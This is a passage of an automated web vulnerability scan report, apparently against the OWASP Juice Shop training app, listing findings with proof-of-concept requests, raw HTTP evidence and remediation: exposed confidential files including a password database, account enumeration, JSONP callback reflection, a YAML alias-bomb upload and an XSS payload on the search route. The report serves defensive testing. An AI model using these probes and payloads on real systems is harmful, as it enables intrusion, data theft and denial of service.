- evidence: [REDACTED_PATH]

```text
URL: http://[REDACTED_HOST]/ftp/acquisitions.md
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Tue, 14 Apr 2026 06:47:22 GMT
ETag: W/"38d-19d8abea090"
Content-Type: text/markdown; charset=UTF-8
Content-Length: 909
Vary: Accept-Encoding
Date: Mon, 04 May 2026 02:00:46 GMT
Connection: close

Body Snippet:
# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year.
This will have a significant stock market impact as we will elaborate in
detail in the following paragraph:

Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy
eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam
voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet
clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit
amet. Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam
nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat,
sed diam voluptua. At vero eos et accusam et justo duo dolores et ea
rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem
ipsum dolor sit amet.

Our shareholders will be excited. It's true. No fake news.
```

### 31. Unauthenticated sensitive endpoint exposure: GET /ftp/announcement_encrypted.md
- Severity: MEDIUM
- Status: validated
- Confidence: 0.82
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: none
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout
- State Changed: no
- Cleanup Attempted: no
- Vector Explanation: Sensitive-looking endpoint `/ftp/announcement_encrypted.md` returned HTTP 200 without authentication.

**Proof Of Concept**
GET http://[REDACTED_HOST]/ftp/announcement_encrypted.md

**Evidence**
`GET http://[REDACTED_HOST]/ftp/announcement_encrypted.md` returned HTTP 200.

**Remediation**
Require authentication and object-level authorization for sensitive API and file endpoints.

**Artifact Review**
- evidence: [REDACTED_PATH]

```text
URL: http://[REDACTED_HOST]/ftp/announcement_encrypted.md
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Tue, 14 Apr 2026 06:47:22 GMT
ETag: W/"5a255-19d8abea090"
Content-Type: text/markdown; charset=UTF-8
Content-Length: 369237
Vary: Accept-Encoding
Date: Mon, 04 May 2026 02:00:46 GMT
Connection: close

Body Snippet:
101090574497118278254226137710017536639773765857153659738605695408072928921910711582659759064103895163344910061580267891538780938737327673897972978699674139013240694666677219690225005597991791021342097443863690867521631887102533624124424473920634357284205977972749676866709367930672889175167124357216863288204
84678702049964035127896877368302320193886098455768332363432424605514741777549598765352488664406159741902969536313365615807705807342321003104495852655512915130050188765284239466210113597760303699022312173073258712597100702393539916597625283858275741383340518666315900387591781569580279341955960362957888697189
52738942978973710444499335094212648235649553500556751113739197966703795929812811872109367849897530719672461613584621227749748743159637124450463765170082743722510939526614783513725649879214102056611979549051428017108970249709601910597007002954025453070108883580204888981915050470487690016926730906263560750604
38842157875943079188185445304579668744732765285296229312069079189604026634975232902567591019360806090163616843896933954511057774277012101804314476185295849622146563538202579085309181093715566609433861522817268155952508279805952520521294438960392472508617643577732121234835368685304804224698356904865781567168
62104638576773623684551385680049598287592117406425744400809134407903643583666708272482545534671166621770408289170731318094044339124299554089107205698606709373381797598251478288011978691275803110552617887693282137095804434097831282225624540169317691447722170457236271134204498185177779451706984833572912654051
11770529878376537392176023801616332054206586403317029204872097283879013592544664155137424315373816381246245926074616104633031546609190393572753761315066067991349063603931902635434527813570053874510249820710406986615227814886395097457348384557242669684705465398169425608330443811691975867383392790839381050813
49753325574865445089772669052891000483752580109613466912771010336607847769281978866460532307952123513083663621765806989683259320224009128424843195798482983529142744938925210736045258659747179875853414003793568639616690520031318358365189672329709227585258829062097623252983992310067500221135568184405349569803
127834769478164514448657989368832148725913788717323254960364403479177512658943589475906085232130280919139734603553084820947341340394949631963818705830501656689270396348803462168537526657806923603818160774689566455932951541886098644908675874178795070128486781922916272919790827233534695358511424166456147425848
127834769478164514448657989368832148725913788717323254960364403479177512658943589475906085232130280919139734603553084820947341340394949631963818705830501656689270396348803462168537526657806923603818160774689566455932951541886098644908675874178795070128486781922916272919790827233534695358511424166456147425848
38842157875943079188185445304579668744732765285296229312069079189604026634975232902567591019360806090163616843896933954511057774277012101804314476185295849622146563538202579085309181093715566609433861522817268155952508279805952520521294438960392472508617643577732121234835368685304804224698356904865781567168
78574888085059728932016020355051254845057542027798831380644526738207017271720961248553305239460318463410612543366391692703942160351564248680419156747819835151192908776085072958707819994156968550260014725465711644134609796499853562476328005416616399377266814386729970069757327077942632748554937325751155612617
127834769478164514448657989368832148725913788717323254960364403479177512658943589475906085232130280919139734603553084820947341340394949631963818705830501656689270396348803462168537526657806923603818160774689566455932951541886098644908675874178795070128486781922916272919790827233534695358511424166456147425848
91680348915962244635467280702269071962770849234751203908734508507942563330754312317275898786442433413770569887551943099443991331261278291587321076702444424684302121767202425952384762689618469717236791027569005894172183324909306235069613007499705735183698684035052271555030322776650321910241652531845417895375
137750765227550514225702921526079247864945181950754004191279860398297269164774487403668182634889775633528548211091913121574076937323802336081931630718919853334596352699339183080539107020795995910595341832851681150580329849056595009984216610828839413881738202804763231117980603408698112207358492939114134102890
100611322685874878848754240661495615711646777488831419813503119374511960510535820058228889027763435983724546057947590061551257712702713723012996004563390427396300527089392464643553160988799916035179912848793338088594261441002497827716739663270148287782372738753596682707263125663143832871706325505355756447001
137750765227550514225702921526079247864945181950754004191279860398297269164774487403668182634889775633528548211091913121574076937323802336081931630718919853334596352699339183080539107020795995910595341832851681150580329849056595009984216610828839413881738202804763231117980603408698112207358492939114134102890
127834769478164514448657989368832148725913788717323254960364403479177512658943589475906085232130280919139734603553084820947341340394949631963818705830501656689270396348803462168537526657806923603818160774689566455932951541886098644908675874178795070128486781922916272919790827233534695358511424166456147425848
18928824824404618546081435030209083267268489418743716085092360940821456571058073610038003667728852565249050914551688677362605878103840934651434075140132384308995728357238735685855259984296884208528911376198941346901774040385519327046561334322491884513919658871624028711808624019905185426957108386637998884956
89938926398532069428812104328780145146529955589041303637458047108510147242848858084348503331879024858042858223391023349608940378566503675271975018311323405400229380745402897172146773327451772982575450766174873446956308213715360627660031724395955295029554684417839579655298468210873009910475123233741237090305
[REDACTED_SECRET]
```

### 32. Unauthenticated sensitive endpoint exposure: GET /ftp/incident-support.kdbx
- Severity: MEDIUM
- Status: validated
- Confidence: 0.82
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: none
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout
- State Changed: no
- Cleanup Attempted: no
- Vector Explanation: Sensitive-looking endpoint `/ftp/incident-support.kdbx` returned HTTP 200 without authentication.

**Proof Of Concept**
GET http://[REDACTED_HOST]/ftp/incident-support.kdbx

**Evidence**
`GET http://[REDACTED_HOST]/ftp/incident-support.kdbx` returned HTTP 200.

**Remediation**
Require authentication and object-level authorization for sensitive API and file endpoints.

**Artifact Review**
- evidence: [REDACTED_PATH]

```text
URL: http://[REDACTED_HOST]/ftp/incident-support.kdbx
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Tue, 14 Apr 2026 06:47:22 GMT
ETag: W/"cae-19d8abea090"
Content-Type: application/octet-stream
Content-Length: 3246
Date: Mon, 04 May 2026 02:00:46 GMT
Connection: close

Body Snippet:
٢gK   1qCPX!jZ      #`U{%۳j<~de6  4..׶_-+6a%c4         "1)/X'uzFƂ  J}r<_iWoP<n"	  83em]ļ)DI&s..,2{
      

آLǿ#BQf*L$"TXR,6ev]?frJΨ3z&'ɤ⊕v_W(nlzQFE9+8$"nUV#p^ϒ-*EsVυ-$mCQk7Lu%&DҡvG.u|@&#ZMi{^bܩOn-"Ŭ2>c6fxJQCҼnMA9(}\D.[w T%o5akCC9U?|ϓ<7qL W&tdcJ*)RW&$8~ZP`#wSw1GW0;^LG"NגpWbѵFhTcHe:ƭ'"\X5YwrUHov=4xF>k|EUqUut
Lk[OVIA"^ǆ vh41INd:Nي8zުYL}ř(&d3(+b:o~x󩲃m<+S4eyE
=mQF{ i&FUxVnTn@rFY2!0F8cs=C	˚m:Y2'ߔgW<rm舃kh*@$Jdeݏ.
yE[x>SG[)i@%Y鬣p=gōXZv?
u7
*gwL$s)m3s3vSӌ܈SeS֏):\wxjݑ57s
9HpxO.&:nʗ*â՝8-w	lz$W''Kn[hfdHZ1y:,78MQ
c-?@W%mGLCc2E9U{zT:=c^	{I^~&b:+ɦ]>)-C^lew!ZG2z\Y-hFO/Xlk೟\epyWJ.Ч@DR*_*0[K9^L䓍_<8fٷ{)~8J.sDYDQI (	@[Ay{m&U,B(9znzj?}:dyNYk.bcЇs6`eO	wÿuMKǝT{_;
4i$1key#%·d(P/Yr5*F
=RGbqy>kMx1ʋgַzꪐ/=u**eߔ'"HN^Lwhl`^U?:]IU׈bd~:^T!7^ɓ)?/3)O|ZUᩇ,I2Y5WwD;\<hM?(ˉzJIvLLv龽9eyEZ%y{ 	R.??̷m҂qƹb
U		%Hr-BKm]3rFݡEP^Z9J "<oO5c|l)ELô21'흫꫌7A9զ?!
SێC ?D!(&@@9iU[+Ei&ȝ+3_/^Zʆ
(c"reUsȉ
@t-.owNfm:Pۼ!-6pōR8yj"^谷	GMb'`)%|ctjI6$WyUT-E|Sx<NUoqes0CH.d俠sSj
.o<s&Ĥ%7L3`gWP[K%<dцfۑꖜ#a d|2zߜΉٞ{	`u&kޚrTX5aѠ%,Iو֧-6]$,.wv9Hc"j$08s,/J.Eky@{pLy!cx+f-OO>}'Ņ$)G
\.șۮS%gycy$4wڔR'#/
Od~DEZpcQꈠn1(4iZ3Fߏ iVi5 ,"r$h=HNMvBĻ}lE)s/|[vRk|In
d4pgf47ZĜ3tHI$O+\ET96Lxv|\17gA/>:ʹ~vI@v>x7r=!3ҵ6ʕtϜ6(P2k!oS aWӌ?}]y"Da:n3!e6Hog䋊:IZ.Ľ"[}|(M43Irϩ J5xe[
sEUpi7nu0$L@`6ٺMŴ6q=p@B0_8$/ԋ愴ǺqU"նѻv[^) Pt孭 R.w<u&\6ѷ7/bw8|pQC*Pv0A2	g
-ul̩y
E*"Y{(bHxz%nk*
0xUly7R
|cԌ	0%eNlg"Oخ6L/H20pg##'Y(+Gpt۳[wK۪ZJXK SmDHEUet2GUmab)ۂU/P$7-_ͺ-۷ѬHys7焥iwE'PFRǕA+飥xfa|
```

### 33. Unauthenticated sensitive endpoint exposure: GET /ftp/legal.md
- Severity: MEDIUM
- Status: validated
- Confidence: 0.82
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: none
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout
- State Changed: no
- Cleanup Attempted: no
- Vector Explanation: Sensitive-looking endpoint `/ftp/legal.md` returned HTTP 200 without authentication.

**Proof Of Concept**
GET http://[REDACTED_HOST]/ftp/legal.md

**Evidence**
`GET http://[REDACTED_HOST]/ftp/legal.md` returned HTTP 200.

**Remediation**
Require authentication and object-level authorization for sensitive API and file endpoints.

**Artifact Review**
- evidence: [REDACTED_PATH]

```text
URL: http://[REDACTED_HOST]/ftp/legal.md
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Mon, 04 May 2026 01:32:36 GMT
ETag: W/"be7-19df09da4fc"
Content-Type: text/markdown; charset=UTF-8
Content-Length: 3047
Vary: Accept-Encoding
Date: Mon, 04 May 2026 02:00:46 GMT
Connection: close

Body Snippet:
# Legal Information

Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy
eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam
voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet
clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit
amet. Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam
nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat,
sed diam voluptua. At vero eos et accusam et justo duo dolores et ea
rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem
ipsum dolor sit amet. Lorem ipsum dolor sit amet, consetetur sadipscing
elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna
aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo
dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus
est Lorem ipsum dolor sit amet.

Duis autem vel eum iriure dolor in hendrerit in vulputate velit esse
molestie consequat, vel illum dolore eu feugiat nulla facilisis at vero
eros et accumsan et iusto odio dignissim qui blandit praesent luptatum
zzril delenit augue duis dolore te feugait nulla facilisi. Lorem ipsum
dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh
euismod tincidunt ut laoreet dolore magna aliquam erat volutpat.

Ut wisi enim ad minim veniam, quis nostrud exerci tation ullamcorper
suscipit lobortis nisl ut aliquip ex ea commodo consequat. Duis autem
vel eum iriure dolor in hendrerit in vulputate velit esse molestie
consequat, vel illum dolore eu feugiat nulla facilisis at vero eros et
accumsan et iusto odio dignissim qui blandit praesent luptatum zzril
delenit augue duis dolore te feugait nulla facilisi.

## Terms of Use

Nam liber tempor cum soluta nobis eleifend option congue nihil imperdiet
doming id quod mazim placerat facer possim assum. Lorem ipsum dolor sit
amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod
tincidunt ut laoreet dolore magna aliquam erat volutpat. Ut wisi enim ad
minim veniam, quis nostrud exerci tation ullamcorper suscipit lobortis
nisl ut aliquip ex ea commodo consequat.

Duis autem vel eum iriure dolor in hendrerit in vulputate velit esse
molestie consequat, vel illum dolore eu feugiat nulla facilisis.

At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd
gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet. Lorem
ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy
eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam
voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet
clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit
amet. Lorem ipsum dolor sit amet, consetetur sadipscing elitr, At
accusam aliquyam diam diam dolore dolores duo eirmod eos erat, et nonumy
sed tempor et et invidunt justo labore Stet clita ea et gubergren, kasd
magna no rebum. sanctus sea sed takimata ut vero voluptua. est Lorem
ipsum dolor sit amet. Lorem ipsum dolor sit amet, consetetur
```

### 34. Account enumeration signal: GET /rest/user/security-question
- Severity: MEDIUM
- Status: validated
- Confidence: 0.81
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: credential-exposure, authz-bypass
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout; capture proof material in run artifacts
- State Changed: no
- Cleanup Attempted: no
- Vector Explanation: Different password-reset/security-question responses indicate whether an account exists.

**Proof Of Concept**
GET http://[REDACTED_HOST]/rest/user/security-question?email=admin%40juice-sh.op vs GET http://[REDACTED_HOST]/rest/user/security-question?email=nonexistent.user.sechive%40example.invalid

**Evidence**
Valid and invalid email probes produced distinct responses.

**Remediation**
Return identical response bodies and timing for valid/invalid account lookups.

**Artifact Review**
- evidence: [REDACTED_PATH]

```text
URL: http://[REDACTED_HOST]/rest/user/security-question
Status: 200
Headers:


Body Snippet:
valid={"question":{"id":2,"question":"Mother's maiden name?","createdAt":"2026-05-04T01:32:37.172Z","updatedAt":"2026-05-04T01:32:37.172Z"}}

invalid={}
```

### 35. JSONP callback execution surface: GET /rest/user/whoami
- Severity: MEDIUM
- Status: validated
- Confidence: 0.80
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: none
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout
- State Changed: no
- Cleanup Attempted: no
- Vector Explanation: The endpoint reflects a callback name into executable JavaScript-style response content.

**Proof Of Concept**
GET http://[REDACTED_HOST]/rest/user/whoami?callback=alert

**Evidence**
`GET http://[REDACTED_HOST]/rest/user/whoami?callback=alert` returned callback execution markers.

**Remediation**
Remove JSONP support where possible; otherwise restrict callback names and return JSON with CORS controls.

**Artifact Review**
- evidence: [REDACTED_PATH]

```text
URL: http://[REDACTED_HOST]/rest/user/whoami?callback=alert
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: text/javascript; charset=utf-8
Content-Length: 55
ETag: W/"37-whmqovYWQaof3cdAN4/anJctaTM"
Vary: Accept-Encoding
Date: Mon, 04 May 2026 02:00:47 GMT
Connection: close

Body Snippet:
/**/ typeof alert === 'function' && alert({"user":{}});
```

### 36. YAML parser resource-exhaustion signal: POST /file-upload
- Severity: MEDIUM
- Status: validated
- Confidence: 0.78
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: availability-impact, state-mutation, persistence-adjacent, rce-adjacent
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout; bounded availability probe only; no sustained load; single canary mutation where required; harmless marker payload only
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: YAML anchor/alias payload triggered parser instability or server error behavior.

**Proof Of Concept**
Upload nested YAML alias payload and observe parser response stability.

**Evidence**
`POST http://[REDACTED_HOST]/file-upload` with nested YAML anchors returned parser/availability error signals.

**Remediation**
Use safe YAML parser configuration, enforce depth/size limits, and reject alias-heavy payloads.

**Artifact Review**
- evidence: [REDACTED_PATH]

```text
URL: http://[REDACTED_HOST]/file-upload
Status: 410
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: text/html; charset=utf-8
Vary: Accept-Encoding
Date: Mon, 04 May 2026 02:00:48 GMT
Connection: close
Transfer-Encoding: chunked

Body Snippet:
<html>
  <head>
    <meta charset='utf-8'>
    <title>Error: B2B customer complaints via file upload have been deprecated for security reasons: {&quot;a&quot;:[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],&quot;b&quot;:[[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;]],&quot;c&quot;:[[[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;]],[[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;]],[[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;... (sechive-bomb.yml)</title>
    <style>* {
  margin: 0;
  padding: 0;
  outline: 0;
}

body {
  padding: 80px 100px;
  font: 13px "Helvetica Neue", "Lucida Grande", "Arial";
  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));
  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);
  background-repeat: no-repeat;
  color: #555;
  -webkit-font-smoothing: antialiased;
}
h1, h2 {
  font-size: 22px;
  color: #343434;
}
h1 em, h2 em {
  padding: 0 5px;
  font-weight: normal;
}
h1 {
  font-size: 60px;
}
h2 {
  margin-top: 10px;
}
ul li {
  list-style: none;
}
#stacktrace {
  margin-left: 60px;
}
</style>
  </head>
  <body>
    <div id="wrapper">
      <h1>OWASP Juice Shop (Express ^4.22.1)</h1>
      <h2><em>410</em> Error: B2B customer complaints via file upload have been deprecated for security reasons: {&quot;a&quot;:[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],&quot;b&quot;:[[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;]],&quot;c&quot;:[[[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;]],[[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;]],[[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;... (sechive-bomb.yml)</h2>
      <ul id="stacktrace"><li> &nbsp; &nbsp;at handleYamlUpload (/juice-shop/build/routes/fileUpload.js:154:22)</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/route.js:149:13)</li><li> &nbsp; &nbsp;at handleXmlUpload (/juice-shop/build/routes/fileUpload.js:141:5)</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/route.js:149:13)</li><li> &nbsp; &nbsp;at handleZipFileUpload (/juice-shop/build/routes/fileUpload.js:88:9)</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/route.js:149:13)</li><li> &nbsp; &nbsp;at checkFileType (/juice-shop/build/routes/fileUpload.js:104:5)</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/route.js:149:13)</li><li> &nbsp; &nbsp;at checkUploadSize (/juice-shop/build/routes/fileUpload.js:96:5)</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/route.js:149:13)</li><li> &nbsp; &nbsp;at /juice-shop/build/routes/metrics.js:84:9</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/route.js:149:13)</li><li> &nbsp; &nbsp;at ensureFileIsPassed (/juice-shop/build/routes/fileUpload.js:46:9)</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/route.js:149:13)</li><li> &nbsp; &nbsp;at done (/juice-shop/node_modules/multer/lib/make-middleware.js:47:7)</li></ul>
    </div>
  </body>
</html>
```

### 37. Client-side reflected XSS sink signal: #/search
- Severity: MEDIUM
- Status: validated
- Confidence: 0.76
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: authz-bypass
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout
- State Changed: no
- Cleanup Attempted: no
- Vector Explanation: Client bundle contains search-route HTML trust bypass logic that can render query-controlled content.

**Proof Of Concept**
Navigate to `http://[REDACTED_HOST]/#/search?q=<img src=x onerror=alert(1)>` and observe whether query content executes in browser context.

**Evidence**
`GET http://[REDACTED_HOST]/main.js` contained search and `bypassSecurityTrustHtml` markers.

**Remediation**
Remove trust-bypass rendering for user-controlled search values and enforce contextual output encoding.

**Artifact Review**
- evidence: [REDACTED_PATH]

```text
URL: http://[REDACTED_HOST]/main.js
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Tue, 14 Apr 2026 06:50:11 GMT
ETag: W/"14cdab-19d8ac134b8"
Content-Type: application/javascript; charset=UTF-8
Content-Length: 1363371
Vary: Accept-Encoding
Date: Mon, 04 May 2026 02:00:47 GMT
Connection: close

Body Snippet:
import{a as Am}from"./chunk-24EZLZ4I.js";import{a as Bm,b as Um,c as N0,d as A6,f as jm,g as OS}from"./chunk-T3PSKZ45.js";import{$ as bm,$a as L1,$b as Qt,A as zS,Aa as M6,Ab as wr,B as b1,Ba as Bi,Bb as J,C as mm,Ca as AS,Cb as z6,D as hm,Da as Pn,Db as mt,E as Ii,Ea as W1,Eb as u2,F as pm,Fa as Sm,Fb as Vn,G as X1,Ga as ga,Gb as _a,H as x0,Ha as km,Hb as ke,I as TS,Ia as DS,Ib as ea,J as C1,Ja as T0,Jb as g2,K as _r,Ka as Pt,Kb as Qa,L as A2,La as fi,Lb as e1,M as M0,Ma as zm,Mb as ba,N as fm,Na as Zo,Nb as Sr,O as um,Oa as Tm,Ob as Vm,P as Qo,Pa as w6,Pb as D0,Q as w0,Qa as S6,Qb as I0,R as gm,Ra as xi,Rb as kr,S as vm,Sa as ze,Sb as L0,T as Ga,Ta as y1,Tb as Mi,U as ES,Ua as Ce,Ub as zr,V as s1,Va as ge,Vb as at,W as Y2,Wa as ve,Wb as zt,X as b6,Xa as va,Xb as We,Y as n1,Ya as E0,Yb as Om,Z as _m,Za as k6,Zb as IS,_ as S0,_a as xr,_b as ht,a as ue,aa as k0,ab as K2,ac as f1,b as Nt,ba as Z2,bb as E1,bc as P0,c as Zd,ca as C6,cb as I2,cc as v2,d as It,da as Yo,db as l1,dc as T6,e as Se,ea as Cm,eb as Em,ec as V0,f as K,fa as An,fb as ui,fc as Ze,g as Y,ga as br,gb as Wa,gc as E6,h as W,ha as y6,hb as le,hc as Qe,i as $1,ia as Dn,ib as oe,ic as LS,j as y0,ja as h2,jb as ne,jc as Je,k as yt,ka as $2,kb as pe,kc as Hm,l as m2,la as Xi,lb as X2,lc as PS,m as om,ma as z0,mb as p2,mc as O0,n as p1,na as D2,nb as Dm,nc as Nm,o as Lt,oa as qt,ob as Im,oc as Rm,p as K1,pa as ym,pb as A0,pc as VS,q as ja,qa as Cr,qb as de,qc as nt,r as pa,ra as Li,rb as he,rc as $e,s as cm,sa as In,sb as J2,sc as et,t as sm,ta as xm,tb as Lm,tc as H0,u as Ki,ua as Mm,ub as Mr,uc as Fm,v as fa,va as Ln,vb as Vt,w as En,wa as wm,wb as J1,x as lm,xa as yr,xb as f2,y as dm,ya as ua,yb as Pm,z as qa,za as x6,zb as gt}from"./chunk-4MIYPPGW.js";import{$ as Ut,$b as m,$c as vr,A as Kt,Aa as He,Ab as c,B as $t,Ba as kt,Bb as s,Cb as u,D as j,Da as ae,Db as Gt,Dc as Qd,Ea as E2,Eb as Jt,Ec as Ee,F as Tn,Fb as Zi,Fc as ur,Gb as _e,Gc as Yd,H as j1,Ha as v6,Hb as be,Hc as Z,I as g6,Ib as _1,Ic as ot,J as Ad,Jb as L,K as Dd,Kb as Ai,L as Id,La as tt,Lb as S,M as Ld,Ma as wt,Mb as qd,Mc as k,Na as _6,Nb as 